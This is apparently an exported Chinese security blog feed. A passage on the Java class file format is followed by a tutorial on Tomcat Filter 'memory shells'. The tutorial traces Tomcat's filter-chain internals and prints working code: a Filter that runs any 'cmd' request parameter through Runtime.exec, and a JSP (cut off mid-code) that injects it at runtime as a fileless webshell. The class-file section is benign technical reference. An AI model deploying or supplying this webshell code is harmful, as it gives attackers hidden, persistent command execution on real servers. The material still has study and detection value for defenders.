class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>编译解析流程为：<code>HelloWorld.java</code>—&gt;（经过编译）—&gt;<code>Java字节码</code>—&gt;（编译/解析）—&gt;<code>机器码</code></p><h2 id="class文件格式"><a href="#class文件格式" class="headerlink" title="class文件格式"></a>class文件格式</h2><p>class 文件的结构是固定的，如下所示：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">ClassFile &#123;</span><br><span class="line">    u4 magic;</span><br><span class="line">    u2 minor_version;</span><br><span class="line">    u2 major_version;</span><br><span class="line">    u2 constant_pool_count;</span><br><span class="line">    cp_info constant_pool[constant_pool_count-<span class="number">1</span>];</span><br><span class="line">    u2 access_flags;</span><br><span class="line">    u2 this_class;</span><br><span class="line">    u2 super_class;</span><br><span class="line">    u2 interfaces_count;</span><br><span class="line">    u2 interfaces[interfaces_count];</span><br><span class="line">    u2 fields_count;</span><br><span class="line">    field_info fields[fields_count];</span><br><span class="line">    u2 methods_count;</span><br><span class="line">    method_info methods[methods_count];</span><br><span class="line">    u2 attributes_count;</span><br><span class="line">    attribute_info attributes[attributes_count];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>在 JVM 规范中<code>u1</code>、<code>u2</code>和<code>u4</code>分别表示的是1、2、4个字节的无符号数，可以使用<code>java.io.DataInputStream</code>类中的对应方法：<code>readUnsignedByte</code>、<code>readUnsignedShort</code>、<code>readInt</code>方法读取。</p><p>除此之外，表结构可以由任意数量的可变长度的项组成，用于表示 class 中的复杂结构，如上述的：<code>cp_info</code>、<code>field_info</code>、<code>method_info</code>和<code>attribute_info</code>。</p><p><code>HelloWorld.class</code>文件十六进制内容：<br><img src="images/image-20220927165058781.png" alt="image-20220927165058781"></p><p>下面我们根据上面固定的<code>class</code>文件结构分析</p><h3 id="Magic"><a href="#Magic" class="headerlink" title="Magic"></a>Magic</h3><p><code>class</code>文件的标识符，也就是文件头，固定值为：<code>0xCAFEBABE</code></p><h3 id="Minor-Major-Version"><a href="#Minor-Major-Version" class="headerlink" title="Minor/Major_Version"></a>Minor/Major_Version</h3><p><code>class</code>文件的版本号由主版本号和副版本号组成，<code>minor_version</code>为副版本号，<code>major_version</code>为主版本号。这里<code>0x00000037</code>可以知道版本号为<code>JDK.11</code></p><p>版本对应表如下所示：</p><div class="table-container"><table><thead><tr><th>JDK版本</th><th><strong>十进制</strong></th><th><strong>十六进制</strong></th><th>发布时间</th></tr></thead><tbody><tr><td>JDK1.1</td><td>45</td><td>2D</td><td>1996-05</td></tr><tr><td>JDK1.2</td><td>46</td><td>2E</td><td>1998-12</td></tr><tr><td>JDK1.3</td><td>47</td><td>2F</td><td>2000-05</td></tr><tr><td>JDK1.4</td><td>48</td><td>30</td><td>2002-02</td></tr><tr><td>JDK1.5</td><td>49</td><td>31</td><td>2004-09</td></tr><tr><td>JDK1.6</td><td>50</td><td>32</td><td>2006-12</td></tr><tr><td>JDK1.7</td><td>51</td><td>33</td><td>2011-07</td></tr><tr><td>JDK1.8</td><td>52</td><td>34</td><td>2014-03</td></tr><tr><td>Java9</td><td>53</td><td>35</td><td>2017-09</td></tr><tr><td>Java10</td><td>54</td><td>36</td><td>2018-03</td></tr><tr><td>Java11</td><td>55</td><td>37</td><td>2018-09</td></tr><tr><td>Java12</td><td>56</td><td>38</td><td>2019-03</td></tr><tr><td>Java13</td><td>57</td><td>39</td><td>2019-09</td></tr><tr><td>Java14</td><td>58</td><td>3A</td><td>2020-03</td></tr><tr><td>Java15</td><td>59</td><td>3B</td><td>2020-09</td></tr></tbody></table></div><h3 id="constant-pool-count"><a href="#constant-pool-count" class="headerlink" title="constant_pool_count"></a>constant_pool_count</h3><p><code>constant_pool_count(常量池计数器)</code>的值等于常量池中的数量加1，注意的是<code>long</code>和<code>double</code>类型的常量池对象占用两个常量位。</p><h3 id="constant-pool"><a href="#constant-pool" class="headerlink" title="constant_pool"></a>constant_pool</h3><p><code>constant_pool(常量池)</code>是一种结构表，代表各种字符串常量、类和接口名称、字段名称以及其他在结构及其子结构中被引用的常量。</p><p>其中<code>cp_info</code>表示的是常量池对象，数据结构如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cp_info &#123;</span><br><span class="line">   u1 tag;</span><br><span class="line">   u1 info[];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><code>u1 tag;</code>表示的是常量池中的存储类型，常量池中的<code>tag</code>说明：</p><div class="table-container"><table><thead><tr><th>Constant Kind</th><th>Tag</th><th><code>class</code> file format</th><th>Java SE</th></tr></thead><tbody><tr><td><code>CONSTANT_Utf8</code></td><td>1</td><td>45.3</td><td>1.0.2</td></tr><tr><td><code>CONSTANT_Integer</code></td><td>3</td><td>45.3</td><td>1.0.2</td></tr><tr><td><code>CONSTANT_Float</code></td><td>4</td><td>45.3</td><td>1.0.2</td></tr><tr><td><code>CONSTANT_Long</code></td><td>5</td><td>45.3</td><td>1.0.2</td></tr><tr><td><code>CONSTANT_Double</code></td><td>6</td><td>45.3</td><td>1.0.2</td></tr><tr><td><code>CONSTANT_Class</code></td><td>7</td><td>45.3</td><td>1.0.2</td></tr><tr><td><code>CONSTANT_String</code></td><td>8</td><td>45.3</td><td>1.0.2</td></tr><tr><td><code>CONSTANT_Fieldref</code></td><td>9</td><td>45.3</td><td>1.0.2</td></tr><tr><td><code>CONSTANT_Methodref</code></td><td>10</td><td>45.3</td><td>1.0.2</td></tr><tr><td><code>CONSTANT_InterfaceMethodref</code></td><td>11</td><td>45.3</td><td>1.0.2</td></tr><tr><td><code>CONSTANT_NameAndType</code></td><td>12</td><td>45.3</td><td>1.0.2</td></tr><tr><td><code>CONSTANT_MethodHandle</code></td><td>15</td><td>51.0</td><td>7</td></tr><tr><td><code>CONSTANT_MethodType</code></td><td>16</td><td>51.0</td><td>7</td></tr><tr><td><code>CONSTANT_Dynamic</code></td><td>17</td><td>55.0</td><td>11</td></tr><tr><td><code>CONSTANT_InvokeDynamic</code></td><td>18</td><td>51.0</td><td>7</td></tr><tr><td><code>CONSTANT_Module</code></td><td>19</td><td>53.0</td><td>9</td></tr><tr><td><code>CONSTANT_Package</code></td><td>20</td><td>53.0</td><td>9</td></tr></tbody></table></div><p>每一种<code>tag</code>都对应了不同的数据结构</p><h3 id="access-flags"><a href="#access-flags" class="headerlink" title="access_flags"></a>access_flags</h3><p><code>access_flags(访问标志)</code>表示的是某个类或者接口的访问权限和属性。</p><div class="table-container"><table><thead><tr><th>标志名</th><th>十六进制值</th><th>描述</th></tr></thead><tbody><tr><td>ACC_PUBLIC</td><td>0x0001</td><td>声明为public</td></tr><tr><td>ACC_FINAL</td><td>0x0010</td><td>声明为final</td></tr><tr><td>ACC_SUPER</td><td>0x0020</td><td>废弃/仅JDK1.0.2前使用</td></tr><tr><td>ACC_INTERFACE</td><td>0x0200</td><td>声明为接口</td></tr><tr><td>ACC_ABSTRACT</td><td>0x0400</td><td>声明为abstract</td></tr><tr><td>ACC_SYNTHETIC</td><td>0x1000</td><td>声明为synthetic，表示该class文件并非由Java源代码所生成</td></tr><tr><td>ACC_ANNOTATION</td><td>0x2000</td><td>标识注解类型</td></tr><tr><td>ACC_ENUM</td><td>0x4000</td><td>标识枚举类型</td></tr></tbody></table></div><p>同时这些标记可以通过或运算进行组合</p><h3 id="this-class"><a href="#this-class" class="headerlink" title="this_class"></a>this_class</h3><p><code>this_class(当前类名称)</code>表示的是当前<code>class</code>文件的类名所在常量池中的索引位置。</p><h3 id="super-class"><a href="#super-class" class="headerlink" title="super_class"></a>super_class</h3><p><code>super_class(当前类的父类名称)</code>表示的是当前<code>class</code>文件的父类类名所在常量池中的索引位置。<code>java/lang/Object</code>类的<code>super_class</code>的为0，其他任何类的<code>super_class</code>都必须是一个常量池中存在的索引位置。</p><h3 id="interfaces-count"><a href="#interfaces-count" class="headerlink" title="interfaces_count"></a>interfaces_count</h3><p><code>interfaces_count(当前类继承或实现的接口数)</code>表示的是当前类继承或实现的接口数。</p><h3 id="interfaces"><a href="#interfaces" class="headerlink" title="interfaces[]"></a>interfaces[]</h3><p><code>interfaces[interface_count](接口名称数组)</code>表示的是所有接口数组。</p><h3 id="fields-count"><a href="#fields-count" class="headerlink" title="fields_count"></a>fields_count</h3><p><code>fields_count(当前类的成员变量数)</code>表示的是当前<code>class</code>中的成员变量个数。</p><h3 id="fields"><a href="#fields" class="headerlink" title="fields[]"></a>fields[]</h3><p><code>field_info fields[fields_count](成员变量数组)</code>表示的是当前类的所有成员变量，<code>field_info</code>表示的是成员变量对象。</p><p><code>field_info</code>数据结构：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">field_info &#123;</span><br><span class="line">   u2 access_flags;</span><br><span class="line">   u2 name_index;</span><br><span class="line">   u2 descriptor_index;</span><br><span class="line">   u2 attributes_count;</span><br><span class="line">   attribute_info attributes[attributes_count];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>属性结构：</p><ol><li><code>u2 access_flags;</code>表示的是成员变量的修饰符；</li><li><code>u2 name_index;</code>表示的是成员变量的名称；</li><li><code>u2 descriptor_index;</code>表示的是成员变量的描述符；</li><li><code>u2 attributes_count;</code>表示的是成员变量的属性数量；</li><li><code>attribute_info attributes[attributes_count];</code>表示的是成员变量的属性信息；</li></ol><h3 id="methods-count"><a href="#methods-count" class="headerlink" title="methods_count"></a>methods_count</h3><p><code>methods_count(当前类的成员方法数)</code>表示的是当前<code>class</code>中的成员方法个数。</p><h3 id="methods"><a href="#methods" class="headerlink" title="methods[]"></a>methods[]</h3><p><code>method_info methods[methods_count](成员方法数组)</code>表示的是当前<code>class</code>中的所有成员方法，<code>method_info</code>表示的是成员方法对象</p><p><code>method_info</code>数据结构：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">method_info &#123;</span><br><span class="line">   u2 access_flags;</span><br><span class="line">   u2 name_index;</span><br><span class="line">   u2 descriptor_index;</span><br><span class="line">   u2 attributes_count;</span><br><span class="line">   attribute_info attributes[attributes_count];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>属性结构：</p><ol><li><code>u2 access_flags;</code>表示的是成员方法的修饰符；</li><li><code>u2 name_index;</code>表示的是成员方法的名称；</li><li><code>u2 descriptor_index;</code>表示的是成员方法的描述符；</li><li><code>u2 attributes_count;</code>表示的是成员方法的属性数量；</li><li><code>attribute_info attributes[attributes_count];</code>表示的是成员方法的属性信息；</li></ol><h3 id="attributes-count"><a href="#attributes-count" class="headerlink" title="attributes_count"></a>attributes_count</h3><p><code>attributes_count(当前类的属性数)</code>表示当前<code>class</code>文件属性表的成员个数。</p><h3 id="attributes"><a href="#attributes" class="headerlink" title="attributes[]"></a>attributes[]</h3><p><code>attribute_info attributes[attributes_count](属性数组)</code>表示的是当前<code>class</code>文件的所有属性，<code>attribute_info</code>是一个非常复杂的数据结构，存储着各种属性信息。<br><code>attribute_info</code>数据结构：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">attribute_info &#123;</span><br><span class="line">   u2 attribute_name_index;</span><br><span class="line">   u4 attribute_length;</span><br><span class="line">   u1 info[attribute_length];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>u2 attribute_name_index;</code>表示的是属性名称索引，读取<code>attribute_name_index</code>值所在常量池中的名称可以得到属性名称。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><img src="images/1.jpeg" alt></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Tomcat内存马之Filter</title>
      <link href="/2021/11/10/Filter%E5%86%85%E5%AD%98%E9%A9%AC/"/>
      <url>/2021/11/10/Filter%E5%86%85%E5%AD%98%E9%A9%AC/</url>
      
        <content type="html"><![CDATA[<h1 id="Tomcat内存马之Filter"><a href="#Tomcat内存马之Filter" class="headerlink" title="Tomcat内存马之Filter"></a>Tomcat内存马之Filter</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关于 Filter 的知识，在前面<a href="../../01-JavaWeb基础/2-Filter/Filter.md">Filter</a>章节已经学习过，这里不再赘述，直接进入分析环节。</p><h2 id="Filter流程分析"><a href="#Filter流程分析" class="headerlink" title="Filter流程分析"></a>Filter流程分析</h2><p>先编写一个简单的 Filter 实现类<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.servlet.study;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebFilter;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/10/21 10:41</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@WebFilter(filterName = &quot;FilterTest&quot;, urlPatterns = &#123;&quot;/*&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FilterTest</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> servletRequest.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(cmd != <span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd).getInputStream();</span><br><span class="line">                <span class="type">ByteArrayOutputStream</span> <span class="variable">bao</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">                <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">                <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">while</span>((a = inputStream.read(bytes))!=-<span class="number">1</span>)&#123;</span><br><span class="line">                    bao.write(bytes, <span class="number">0</span>, a);</span><br><span class="line">                &#125;</span><br><span class="line">                servletResponse.getWriter().write(<span class="keyword">new</span> <span class="title class_">String</span>(bao.toByteArray()));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 使下一个 Filter 能够继续执行</span></span><br><span class="line">        filterChain.doFilter(servletRequest,servletResponse);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>访问后带上参数执行命令<br><img src="/2021/11/10/Filter%E5%86%85%E5%AD%98%E9%A9%AC/image-20221031113025485.png" alt="image-20221031113025485"></p><p>在<code>doFilter()</code>处方法打上断点，看看调用栈<br><img src="/2021/11/10/Filter%E5%86%85%E5%AD%98%E9%A9%AC/image-20221031144738930.png" alt="image-20221031144738930"></p><p>从<code>StandardWrapperValve#invoke()</code>方法跟起<br><img src="/2021/11/10/Filter%E5%86%85%E5%AD%98%E9%A9%AC/image-20221031144936619.png" alt="image-20221031144936619"></p><p>首先通过<code>ApplicationFilterFactory.createFilterChain()</code>方法创建了一个<code>ApplicationFilterChain</code>类型对象，跟进<code>createFilterChain()</code>方法<br><img src="/2021/11/10/Filter%E5%86%85%E5%AD%98%E9%A9%AC/image-20221031145633764.png" alt="image-20221031145633764"></p><p>初始化了<code>ApplicationFilterChain</code>对象，继续往下走<br><img src="/2021/11/10/Filter%E5%86%85%E5%AD%98%E9%A9%AC/image-20221031161929404.png" alt="image-20221031161929404"></p><p>接下来获取到了<code>StandardContext</code>类对象<code>context</code>，并通过<code>context.findFilterMaps()</code>方法拿到了<code>filterMaps</code>数组，继续往下走<br><img src="/2021/11/10/Filter%E5%86%85%E5%AD%98%E9%A9%AC/image-20221031162125403.png" alt="image-20221031162125403"></p><p>在 if 条件中，请求路径和<code>filterMap</code>设置的规则进行匹配，如果满足则进入 if 条件中，接着根据<code>filterMap</code>对象中存储的<code>filter</code>名称在<code>StandardContext</code>类的<code>filterConfigs</code>寻找<code>filterConfig</code>，如果不为空则通过<code>addFilter()</code>方法添加到<code>filterChain</code>的属性中<br><img src="/2021/11/10/Filter%E5%86%85%E5%AD%98%E9%A9%AC/image-20221031162208826.png" alt="image-20221031162208826"></p><p><code>addFilter()</code>方法源码如上图所示，代码逻辑就是进行了去重、扩容并添加<code>filterConfig</code>。</p><p>最后回到<code>StandardWrapperValve</code>类中往下走<br><img src="/2021/11/10/Filter%E5%86%85%E5%AD%98%E9%A9%AC/image-20221031151815580.png" alt="image-20221031151815580"></p><p>跟进<code>filterChain.doFilter()</code>方法中<br><img src="/2021/11/10/Filter%E5%86%85%E5%AD%98%E9%A9%AC/image-20221031151928083.png" alt="image-20221031151928083"></p><p>继续跟进<code>internalDoFilter()</code>方法<br><img src="/2021/11/10/Filter%E5%86%85%E5%AD%98%E9%A9%AC/image-20221031152051403.png" alt="image-20221031152051403"></p><p>创建了<code>ApplicationFilterConfig</code>类对象<code>filterConfig</code>，然后通过<code>filterConfig.getFilter()</code>方法取出<code>filter</code>，接着调用<code>filter.doFilter()</code>方法，跟进后就是我们编写的恶意类<code>FilterTest</code><br><img src="/2021/11/10/Filter%E5%86%85%E5%AD%98%E9%A9%AC/image-20221031152224431.png" alt="image-20221031152224431"></p><p>至此步骤算是走完了，总结一下流程：</p><ol><li>通过<code>ApplicationFilterFactory.createFilterChain()</code>方法初始化<code>ApplicationFilterChain</code>对象；<ul><li>初始化空的<code>ApplicationFilterChain</code>对象；</li><li>获取<code>StandardContext</code>类对象，并中<code>StandardContext</code>类对象中取出<code>FilterMaps</code>数组,<code>FilterMaps</code>数组中的<code>FilterMap</code>存储名称和匹配规则；</li><li>根据<code>FilterMap</code>的名称在<code>StandardContext</code>类的<code>filterConfigs</code>中查找，如果不为空则添加到<code>filterChain</code>对象的属性中；</li></ul></li><li>执行<code>filterChain#doFilter()</code>方法进入编写的恶意实现类<code>FilterTest</code>的<code>doFilter()</code>方法中执行代码。</li></ol><p>接下来再看看<code>Filter</code>的初始化加载流程，把断点打在类名处<br><img src="/2021/11/10/Filter%E5%86%85%E5%AD%98%E9%A9%AC/image-20221031160325554.png" alt="image-20221031160325554"></p><p>看看调用栈<br><img src="/2021/11/10/Filter%E5%86%85%E5%AD%98%E9%A9%AC/image-20221031160352961.png" alt="image-20221031160352961"></p><p>跟进<code>filterStart()</code>方法<br><img src="/2021/11/10/Filter%E5%86%85%E5%AD%98%E9%A9%AC/image-20221031161602064.png" alt="image-20221031161602064"></p><p>遍历 Map 对象<code>filterDefs</code>并获取到<code>entry.getValue()</code>，作为参数传入初始化的<code>ApplicationFilterConfig</code>对象<code>filterConfig</code>，然后通过<code>put()</code>方法把<code>filterConfig</code>添加到<code>filterConfigs</code>中。</p><p>至此我们知道和 filter 有关的三个字段分别为：<code>filterMaps</code>、<code>filterDefs</code>和<code>filterConfigs</code></p><h2 id="Filter内存马的实现"><a href="#Filter内存马的实现" class="headerlink" title="Filter内存马的实现"></a>Filter内存马的实现</h2><p>我们先总结一下这三个字段存储的内容</p><h3 id="filterMaps"><a href="#filterMaps" class="headerlink" title="filterMaps"></a>filterMaps</h3><p><img src="/2021/11/10/Filter%E5%86%85%E5%AD%98%E9%A9%AC/image-20221031163323171.png" alt="image-20221031163323171"></p><p>可以看到在<code>filterMaps</code>中以数组的方式存储着 filter 的名称和路径映射信息，其中<code>dispatcherMapping</code>、<code>filterName</code>和<code>urlPatterns</code>是必须的。</p><h3 id="filterDefs"><a href="#filterDefs" class="headerlink" title="filterDefs"></a>filterDefs</h3><p><img src="/2021/11/10/Filter%E5%86%85%E5%AD%98%E9%A9%AC/image-20221031163520399.png" alt="image-20221031163520399"></p><p><code>filterDefs</code>以键值对的方式存储<code>filterDef</code>，<code>filterDef</code>为 Map 对象，value 存储着重要的<code>filter</code>、<code>filterClass</code>和<code>filterName</code>。</p><h3 id="filterConfigs"><a href="#filterConfigs" class="headerlink" title="filterConfigs"></a>filterConfigs</h3><p><img src="/2021/11/10/Filter%E5%86%85%E5%AD%98%E9%A9%AC/image-20221031164103231.png" alt="image-20221031164103231"></p><p><code>filterConfigs</code>存储着当前的上下文<code>StandardContext</code>（WEB 应用），<code>filter</code>对象和<code>filterDef</code>等等信息。</p><p>经过前面的分析，我们可以通过控制上述三个属性的内容达到动态添加恶意 Filter 的目的， 思路如下：</p><ol><li>编写恶意的 Filter 实现类；</li><li>获取<code>StandardContext</code>对象；</li><li>利用<code>FilterDef</code>对<code>filter</code>进行封装；</li><li>创建<code>FilterMap</code>，将<code>filterName</code>和<code>urlPatterns</code>进行绑定（因为 Filter 是按照先后顺序进行调用，所以我们最好把恶意 Filter 放到最前面）</li><li>使用<code>ApplicationFilterConfig</code>封装<code>filterDef</code>，然后将其添加到<code>filterConfigs</code>中</li></ol><p>最后 Filter 内存马实现如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.ByteArrayOutputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Context&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Map&quot;</span> %&gt;&lt;%--</span><br><span class="line">  Created by dotast on <span class="number">2022</span>/<span class="number">10</span>/<span class="number">31</span> <span class="number">16</span>:<span class="number">51</span></span><br><span class="line">--%&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">FilterTest</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> servletRequest.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(cmd != <span class="literal">null</span>)&#123;</span><br><span class="line">                    <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd).getInputStream();</span><br><span class="line">                    <span class="type">ByteArrayOutputStream</span> <span class="variable">bao</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">                    <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">                    <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">                    <span class="keyword">while</span>((a = inputStream.read(bytes))!=-<span class="number">1</span>)&#123;</span><br><span class="line">                        bao.write(bytes, <span class="number">0</span>, a);</span><br><span class="line">                    &#125;</span><br><span class="line">                    servletResponse.getWriter().write(<span class="keyword">new</span> <span class="title class_">String</span>(bao.toByteArray()));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 使下一个 Filter 